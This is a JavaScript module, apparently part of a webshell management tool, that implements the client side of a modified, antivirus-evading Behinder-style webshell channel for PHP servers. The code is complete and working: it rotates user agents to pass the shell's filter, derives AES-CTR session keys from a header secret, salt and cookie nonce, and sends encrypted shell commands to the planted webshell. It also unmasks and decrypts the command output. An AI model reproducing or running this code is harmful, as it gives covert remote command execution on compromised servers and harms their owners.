// dsh-webshell-mgr 魔改冰蝎型通道（behinder-mod）：免杀侧魔改马 demo 的客户端复刻。
//   ① UA 池：请求 UA 必须在马侧池内（池外 404）——客户端从同池轮换
//   ② 密钥协商：首包（X-T 头携带 sess 值）→ Set-Cookie n=<nonce>；
//      会话密钥 key = md5(sess + SALT + nonce)[0:16]；请求 IV = nonce（16 hex 字符）
//   ③ 请求体 = AES-128-CTR(key, iv, "cmd" + 命令)（3 字节功能码）；响应 = base64( 分块(256B)
//      XOR 掩码( md5_raw(key+i) 循环 ) )，去掩码后 AES-128-CTR(key, iv2=md5(nonce+"resp")[0:16])
//      解密——尾部有 0..8 字节随机填充，命令输出用 __WSMEND__ 哨兵切割。
// conn.password = X-T 头的 sess 值；conn.secretKey = 马侧盐（默认 demo 盐）。

import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex, md5raw, cookieHeaderFor, absorbCookies, clearCookies } from "./http-client.js";

const UA_POOL = [
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
];
const DEFAULT_SALT = "x9k2";
const CHUNK = 256;
const SENTINEL = "__WSMEND__";

const scopeOf = (conn) => conn.__scope ?? conn.id ?? conn.url;

function ctr(key, iv, data, encrypt) {
	const buf = encrypt
		? createCipheriv("aes-128-ctr", Buffer.from(key, "utf8"), Buffer.from(iv, "utf8")).update(Buffer.from(data))
		: createDecipheriv("aes-128-ctr", Buffer.from(key, "utf8"), Buffer.from(iv, "utf8")).update(Buffer.from(data));
	return buf; // CTR 流式：update 即全部（不去 final——流密码无 padding）
}

function derive(conn, nonce) {
	const salt = conn.secret_key || conn.secretKey || DEFAULT_SALT;
	const key = md5hex((conn.password ?? "") + salt + nonce).slice(0, 16);
	const iv = nonce.slice(0, 16).padEnd(16, "0");
	const iv2 = md5hex(nonce + "resp").slice(0, 16);
	return { key, iv, iv2 };
}

/** 分块异或掩码（掩码 = md5_raw(key+i) 以 16B 为基循环覆盖块长）。 */
function maskChunk(key, chunkIndex, length) {
	const base = md5raw(key + String(chunkIndex));
	const out = Buffer.alloc(length);
	for (let i = 0; i < length; i++) out[i] = base[i % 16];
	return out;
}

/** 首包协商：拿 nonce Cookie。 */
async function handshake(conn) {
	const scope = scopeOf(conn);
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: {
			"x-t": conn.password ?? "",
			"user-agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
			"content-type": "application/octet-stream",
			...(cookieHeaderFor(scope) ? { cookie: cookieHeaderFor(scope) } : {})
		},
		body: Buffer.alloc(0),
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(scope, res.headers);
	const setCookies = res.headers["set-cookie"] ?? [];
	const line = (Array.isArray(setCookies) ? setCookies : [setCookies]).find((c) => /^n=/i.test(String(c)));
	const nonce = line ? String(line).split(";")[0].slice(2).trim() : "";
	if (!/^[0-9a-f]{16,}$/i.test(nonce)) throw new Error("协商失败：未下发 nonce Cookie");
	return nonce;
}

async function nonceFor(conn) {
	const scope = scopeOf(conn);
	if (cookieHeaderFor(scope).includes("n=")) return; // 已有会话
	await handshake(conn);
}

/** 业务请求：cmd 功能码执行命令，返回去填充原文。 */
export async function execCommand(conn, command, os) {
	await nonceFor(conn);
	const scope = scopeOf(conn);
	const cookie = cookieHeaderFor(scope);
	const m = /(?:^|;\s*)n=([0-9a-f]+)/i.exec(cookie ?? "");
	if (!m) throw new Error("会话 Cookie 丢失，请重连");
	const nonce = m[1];
	const { key, iv, iv2 } = derive(conn, nonce);
	const pt = Buffer.from("cmd" + command, "utf8");
	const body = ctr(key, iv, pt, true);
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		headers: {
			"x-t": conn.password ?? "",
			"user-agent": UA_POOL[Math.floor(Math.random() * UA_POOL.length)],
			"content-type": "application/octet-stream",
			cookie
		},
		body,
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}）`);
	absorbCookies(scope, res.headers);
	// base64 → 逐块去掩码 → 拼回密文 → CTR 解密
	const wrapped = unb64(res.bodyBuffer.toString("utf8").trim());
	const ct = Buffer.alloc(wrapped.length);
	for (let off = 0; off < wrapped.length; off += CHUNK) {
		const blk = wrapped.subarray(off, Math.min(off + CHUNK, wrapped.length));
		const mask = maskChunk(key, off, blk.length);
		for (let i = 0; i < blk.length; i++) ct[off + i] = blk[i] ^ mask[i];
	}
	return ctr(key, iv2, ct, false);
}

/** 执行并按哨兵切割随机尾填充。 */
export async function runCommand(conn, command, os) {
	const sep = os === "windows" ? " & " : "; ";
	const raw = await execCommand(conn, command + sep + "echo " + SENTINEL, os);
	const text = raw.toString("utf8");
	const i = text.indexOf(SENTINEL);
	return i >= 0 ? text.slice(0, i).replace(/\n$/, "") : text;
}

const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	// 协商态易受瞬时超时影响：失败清 cookie（弃 nonce）重试一次
	for (let i = 0; i < 2; i++) {
		try {
			const token = probeToken();
			const raw = await execCommand({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 9000) }, "echo " + token);
			if (raw.toString("utf8").includes(token)) return { tokenOutput: raw.toString("utf8") };
			clearCookies(scopeOf(conn));
		} catch {
			clearCookies(scopeOf(conn));
		}
	}
	return null;
}

export const behinderModCodec = {
	id: "behinder-mod",
	label: "魔改冰蝎型通道",
	langs: ["php"],
	caps: { cmd: true, code: false },
	run: runCommand
};
